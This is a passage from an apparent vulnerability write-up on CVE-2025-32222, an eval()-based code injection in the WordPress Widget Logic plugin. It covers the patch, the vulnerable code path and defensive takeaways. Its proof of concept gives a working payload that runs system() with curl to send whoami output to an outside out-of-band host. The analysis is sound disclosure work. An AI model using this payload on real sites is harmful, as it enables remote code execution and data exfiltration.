class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;widget_logic_parse_expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tokens&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$pos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allowed_functions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;if&amp;ensp;there&amp;ensp;are&amp;ensp;any&amp;ensp;unexpected&amp;ensp;tokens&amp;ensp;after&amp;ensp;the&amp;ensp;expression&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pos&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tokens&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Widget&amp;ensp;Logic:&amp;ensp;Unexpected&amp;ensp;tokens&amp;ensp;after&amp;ensp;expression.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;widget-logic&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;widget_logic_error_handler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;E_USER_WARNING&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMessage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;finally&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;restore_error_handler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/diff.png&#34; title=&#34;Changes introduced in the patch&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Changes introduced in the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/diff.png&#39; alt=&#34;Diff&#34; height=&#34;876&#34; width=&#34;1899&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Changes introduced in the patch&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch removes &lt;code&gt;eval()&lt;/code&gt; and replaces it with a &lt;strong&gt;tokenizer and parser&lt;/strong&gt; to evaluate the logic, allowing only functions in a &lt;strong&gt;whitelist&lt;/strong&gt;. It validates the syntax, detects unexpected tokens, and handles errors with &lt;code&gt;try/catch/finally&lt;/code&gt;, thereby &lt;strong&gt;strengthening security&lt;/strong&gt; while still ensuring normal widget logic behavior.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a filter hook:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;render_block&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;widget_logic_block_render&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;render_block&lt;/code&gt; is a WordPress filter hook that is called whenever a block (Gutenberg block) is rendered. This means that when a post/page is created, the plugin intercepts the block rendering process with the &lt;code&gt;widget_logic_block_render&lt;/code&gt; callback.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;widget_logic_block_render&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$block_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$block&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$block&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;attrs&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;widgetLogic&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$block_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;widget_logic_check_logic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$block&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;attrs&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;widgetLogic&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$block_content&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;widget_logic_block_render&lt;/code&gt; function checks if the block has the &lt;code&gt;widgetLogic&lt;/code&gt; attribute. If not, it is rendered normally. This attribute is added through the &lt;strong&gt;Advanced Option&lt;/strong&gt; when adding a block.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/widget.png&#34; title=&#34;Widget Logic in Advanced Options&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;Widget&lt;/h2&gt;&lt;p&gt;Widget Logic in Advanced Options&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/widget.png&#39; alt=&#34;Widget&#34; height=&#34;622&#34; width=&#34;347&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Widget Logic in Advanced Options&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;widget_logic_check_logic&lt;/code&gt; is called if the block contains this attribute.&lt;/p&gt;&#xA;&lt;p&gt;The vulnerability is disclosed with a required privilege of &lt;strong&gt;Contributor&lt;/strong&gt;, since this role can create posts and use Widget Logic in Advanced Options.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Contributor&amp;ensp;creates/edits&amp;ensp;a&amp;ensp;Gutenberg&amp;ensp;block&#34;]&amp;ensp;--&gt;&amp;ensp;B[&#34;Add&amp;ensp;widgetLogic&amp;ensp;value&amp;ensp;in&amp;ensp;Advanced&amp;ensp;Options&#34;]&#xD;&#xA;&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;Page/Post&amp;ensp;is&amp;ensp;rendered&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;render_block&amp;ensp;filter&amp;ensp;is&amp;ensp;triggered&#34;]&#xD;&#xA;&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;widget_logic_block_render()&amp;ensp;is&amp;ensp;called&#34;]&#xD;&#xA;&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F{&#34;block[&#39;attrs&#39;][&#39;widgetLogic&#39;]&amp;ensp;exists?&#34;}&#xD;&#xA;F&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;G[&#34;Render&amp;ensp;block&amp;ensp;normally&#34;]&#xD;&#xA;F&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;H[&#34;Pass&amp;ensp;widgetLogic&amp;ensp;to&amp;ensp;widget_logic_check_logic()&#34;]&#xD;&#xA;&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;I[&#34;Normalize&amp;ensp;&amp;&amp;ensp;wrap&amp;ensp;logic&amp;ensp;with&amp;ensp;return(...)&amp;ensp;if&amp;ensp;needed&#34;]&#xD;&#xA;I&amp;ensp;--&gt;&amp;ensp;J[&#34;Execute&amp;ensp;logic&amp;ensp;using&amp;ensp;eval()&#34;]&#xD;&#xA;&#xD;&#xA;J&amp;ensp;--&gt;&amp;ensp;K{&#34;Result&amp;ensp;=&amp;ensp;true&amp;ensp;?&#34;}&#xD;&#xA;K&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;L[&#34;Block&amp;ensp;content&amp;ensp;is&amp;ensp;displayed&#34;]&#xD;&#xA;K&amp;ensp;--&amp;ensp;No&amp;ensp;--&gt;&amp;ensp;M[&#34;Block&amp;ensp;is&amp;ensp;hidden&amp;ensp;(empty)&#34;]&#xD;&#xA;&#xD;&#xA;J&amp;ensp;--&gt;&amp;ensp;N{&#34;Malicious&amp;ensp;code&amp;ensp;injected?&#34;}&#xD;&#xA;N&amp;ensp;--&amp;ensp;Yes&amp;ensp;--&gt;&amp;ensp;O[&#34;Arbitrary&amp;ensp;PHP&amp;ensp;code&amp;ensp;executed&amp;ensp;(RCE)&#34;]&#xD;&#xA;&#xD;&#xA;L&amp;ensp;--&gt;&amp;ensp;Z[&#34;End&#34;]&#xD;&#xA;M&amp;ensp;--&gt;&amp;ensp;Z&#xD;&#xA;O&amp;ensp;--&gt;&amp;ensp;Z&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Log in as a &lt;strong&gt;Contributor&lt;/strong&gt; user&lt;/li&gt;&#xA;&lt;li&gt;Create a post, add any block, and add the payload in &lt;strong&gt;Widget Logic&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;system(&amp;#39;curl&amp;ensp;http://929topgvyzo9d93rxe1xpxcriio9cz0o.oastify.com/?leadked=$(whoami)&amp;#39;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/result.png&#39; alt=&#34;Result&#34; height=&#34;582&#34; width=&#34;1131&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;CVEâ€‘2025â€‘32222 stems from the &lt;strong&gt;use of &lt;code&gt;eval()&lt;/code&gt; on user-controlled data&lt;/strong&gt; in &lt;code&gt;widget_logic_check_logic()&lt;/code&gt;. With only &lt;strong&gt;Contributor&lt;/strong&gt; privileges, an attacker can inject malicious logic into the &lt;code&gt;widgetLogic&lt;/code&gt; attribute of a block, causing arbitrary PHP code to be executed during the &lt;code&gt;render_block&lt;/code&gt; process. The automatic wrapping with &lt;code&gt;return(...)&lt;/code&gt; makes exploitation even easier, as any input ultimately becomes valid PHP code. Version 6.0.6 fully addresses this by removing &lt;code&gt;eval()&lt;/code&gt; and introducing a &lt;strong&gt;tokenize + parse + allowlist&lt;/strong&gt; mechanism, effectively blocking arbitrary code execution.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never use &lt;code&gt;eval()&lt;/code&gt; on user-supplied data, even if the user has lower privileges than an admin.&lt;/li&gt;&#xA;&lt;li&gt;Logical expressions should be processed using a &lt;strong&gt;dedicated parser + function whitelist&lt;/strong&gt;, not by direct execution.&lt;/li&gt;&#xA;&lt;li&gt;Data attached to blocks (block attributes) is still &lt;strong&gt;user 